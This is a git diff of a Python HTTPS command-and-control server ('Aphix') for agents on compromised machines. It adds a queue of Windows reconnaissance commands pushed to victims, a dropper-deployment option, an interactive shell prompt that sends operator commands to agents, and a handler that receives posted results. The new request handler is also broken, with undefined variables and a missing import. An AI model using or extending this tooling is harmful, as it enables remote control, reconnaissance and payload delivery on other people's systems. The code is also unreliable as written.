@@ -6,34 +6,91 @@
 # Description:
 # Aphix is an HTTPS C2 server which can establish remote control over Gribley client connected agents.
 
-import http.server
-import os, cgi
 import sys
 import ssl
+import os, cgi
+import argparse
+import http.server
+import http.server
+from socket import gethostname, gethostbyname
+from requests import get
+from os import system
 
-# Steps to generate self-signed cert
-# openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
-# openssl x509 -text -noout -in certificate.pem
-# openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
-# openssl pkcs12 -in certificate.p12 -noout -info
+sys_enum_commands = ["systeminfo\n",
+                    "hostname\n",
+                    "net users\n",
+                    "ipconfig /all\n",
+                    "route print\n",
+                    "arp -A\n",
+                    "netstat -ano\n",
+                    "netsh firewall show state\n",
+                    "netsh firewall show config\n",
+                    "schtasks /query /fo LIST /v\n",
+                    "tasklist /SVC\n",
+                    "net start\n"]
 
 
+help_example = "EXAMPLE: aphix_server.py -enumerate -deploy [file.exe] -port 344 "
+parser = argparse.ArgumentParser(description='Aphix Server: C2 CLI Server w/ SSL/HTTP Comms.'+'\n\n'+help_example, formatter_class=argparse.RawTextHelpFormatter)
+parser.add_argument('-p', '--port')
+parser.add_argument('-enumerate', action='store_true', help='Perform enumeration procedures on Gribley compromised systems.')
+parser.add_argument('-deploy', action='store_true', help='Deploy specified dropper to Gribley compromised systems.')
+args = parser.parse_args()
+
+
+PORT_NUMBER = 443
 HOST_NAME = ''
-try:
-        PORT_NUMBER = int(sys.argv[1])
-except:
-        print("No port specified.  Defaulting to 443/TCP")
-        PORT_NUMBER = 443
+ENUMERATE = False
+DEPLOY = False
+PERSIST = False
+INFECT = False
+HARVEST = False
+
+# The first argument passed to aphix is the port number.  
+def setPortNumber(portnum):
+     PORT_NUMBER = portnum
+
+def cert_help():
+        helpfile =  """
+        #Steps to generate self-signed cert
+        Step 1:
+        openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+
+        Step 2:
+        openssl x509 -text -noout -in certificate.pem
+
+        Step 3:
+        openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
+
+        Step 4:
+        openssl pkcs12 -in certificate.p12 -noout -info
+        """
+        print(helpfile)
+
 
 class MyHandler(http.server.BaseHTTPRequestHandler):
 
-    def do_GET(self):
+    def do_GET_old(self):
         dir(self)
         command = input("Shell> ")
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
         self.wfile.write(command.encode())
+
+    def do_GET(self):
+        global count
+        dir(self)
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        if ENUMERATE:
+                if count < len(sys_enum_commands):
+                        self.wfile.write(sys_enum_commands[count].encode())
+                        time.sleep(.3)
+                        count += 1
+        sys.wfile.write(command.encode())
+
 
     def do_POST(self):
         if self.path == '/store':
@@ -58,12 +115,42 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
         postVar = self.rfile.read(length)
         print(postVar.decode())
 
+
+
 if __name__ == '__main__':
+    start_status = ""
+    if args.port:
+        srvport = args.port.split('-')[0]            
+        setPortNumber(srvport)
+        PORT_NUMBER = int(srvport)
+    elif args.enumerate:
+        ENUMERATE = True
+    elif args.deploy:
+        DEPLOY = True
+
+
+
     server_class = http.server.HTTPServer
     httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
-    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="./key.pem", certfile="./certificate.pem", server_side=True)
+    pub_ip = get('https://api.ipify.org').text
+    lan_ip = gethostbyname(gethostname())
+
     try:
-        print('[+] Starting C2 Server')
+        httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="./key.pem", certfile="./certificate.pem", server_side=True)
+    except:
+        print('Self-signed certificate files missing. Refer to README.md')
+        print('Rerun the server.')
+    try:
+        print('[+] Starting Aphix C2 Server 0.0.0.0:' + str(PORT_NUMBER))
+        print('   lan: https:\\\\'+lan_ip+":"+str(PORT_NUMBER))
+        print('   wan: https:\\\\'+pub_ip+":"+str(PORT_NUMBER))
+        print()
+        print('[+] Server started with the following activated modules: ')
+        if ENUMERATE:
+                print("   [!] Enumeration/Interrogation engaged for incoming agent.")
+        elif DEPLOY:
+                print("   [!] Dropper deployment engaged for incoming agents.")
+        print("\nServer started....")
         httpd.serve_forever()
     except KeyboardInterrupt:
         print('[!] Server is terminated')
